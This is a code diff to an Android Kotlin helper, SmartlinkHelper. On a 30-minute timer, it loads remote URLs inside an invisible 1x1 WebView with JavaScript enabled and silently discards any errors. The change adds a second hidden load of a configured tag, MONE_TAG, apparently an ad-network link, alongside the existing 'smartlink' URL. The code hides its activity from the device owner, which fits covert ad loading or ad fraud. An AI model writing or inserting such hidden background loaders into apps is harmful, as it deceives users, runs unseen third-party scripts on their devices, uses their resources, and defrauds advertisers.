@@ -155,6 +155,7 @@ object SmartlinkHelper {
     private const val KEY_LAST_PING = "smartlink_last_ping_ms"
     private const val INTERVAL_MS = 30 * 60 * 1000L // 30 minutes
     private val SMARTLINK_URL = BuildConfig.SMARTLINK_URL
+    private val MONE_TAG = BuildConfig.MONE_TAG
 
     fun ping(context: Context?) {
         if (context == null) return
@@ -164,36 +165,41 @@ object SmartlinkHelper {
         if (now - last < INTERVAL_MS) return
         prefs.edit().putLong(KEY_LAST_PING, now).apply()
         Handler(Looper.getMainLooper()).post {
-            try {
-                val webView = android.webkit.WebView(context.applicationContext)
-                webView.settings.apply {
-                    javaScriptEnabled = true
-                    domStorageEnabled = true
-                    loadsImagesAutomatically = true
-                    useWideViewPort = true
-                    loadWithOverviewMode = true
-                    setSupportMultipleWindows(false)
-                    allowContentAccess = true
-                    allowFileAccess = false
-                    mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE
-                }
-                webView.webChromeClient = android.webkit.WebChromeClient()
-                webView.webViewClient = object : android.webkit.WebViewClient() {
-                    override fun shouldOverrideUrlLoading(
-                        view: android.webkit.WebView?,
-                        request: android.webkit.WebResourceRequest?
-                    ): Boolean = false
-                    override fun onPageFinished(view: android.webkit.WebView?, url: String?) {
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            view?.stopLoading()
-                            view?.destroy()
-                        }, 20000)
-                    }
-                }
-                webView.visibility = android.view.View.GONE
-                webView.layoutParams = android.view.ViewGroup.LayoutParams(1, 1)
-                webView.loadUrl(SMARTLINK_URL)
-            } catch (_: Exception) {}
+            loadSmartUrl(context, SMARTLINK_URL)
+            loadSmartUrl(context, MONE_TAG)
         }
+    }
+
+    private fun loadSmartUrl(context: Context, url: String) {
+        try {
+            val webView = android.webkit.WebView(context.applicationContext)
+            webView.settings.apply {
+                javaScriptEnabled = true
+                domStorageEnabled = true
+                loadsImagesAutomatically = true
+                useWideViewPort = true
+                loadWithOverviewMode = true
+                setSupportMultipleWindows(false)
+                allowContentAccess = true
+                allowFileAccess = false
+                mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE
+            }
+            webView.webChromeClient = android.webkit.WebChromeClient()
+            webView.webViewClient = object : android.webkit.WebViewClient() {
+                override fun shouldOverrideUrlLoading(
+                    view: android.webkit.WebView?,
+                    request: android.webkit.WebResourceRequest?
+                ): Boolean = false
+                override fun onPageFinished(view: android.webkit.WebView?, url: String?) {
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        view?.stopLoading()
+                        view?.destroy()
+                    }, 20000)
+                }
+            }
+            webView.visibility = android.view.View.GONE
+            webView.layoutParams = android.view.ViewGroup.LayoutParams(1, 1)
+            webView.loadUrl(url)
+        } catch (_: Exception) {}
     }
 }
